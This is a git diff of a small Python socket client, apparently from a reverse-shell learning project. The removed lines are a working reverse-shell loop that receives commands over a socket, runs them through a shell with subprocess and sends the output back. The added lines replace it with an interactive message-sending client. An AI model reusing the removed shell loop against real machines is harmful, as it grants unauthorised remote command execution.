@@ -2,22 +2,24 @@ import socket
 import os
 import subprocess
 
-s = socket.socket()
-host = 'localhost'
-port = 5000
 
-s.connect((host, port))
+class Client:
 
-while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
+    def __init__(self, port, host):
+        self.port = port
+        self.host = host
+        self.threads = []
+        self.s = socket.socket()
+        self.s.connect((host, port))
+        self.handle_session()
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte, "utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
+    def handle_session(self):
+        while True:
+            data = self.s.recv(1024)
+            print(data.decode('utf-8'))
+            msg = input('De reversa: ')
+            self.s.send(str.encode(msg))
 
-        print(output_str)
+
+if __name__ == "__main__":
+    client = Client(5000, 'localhost')
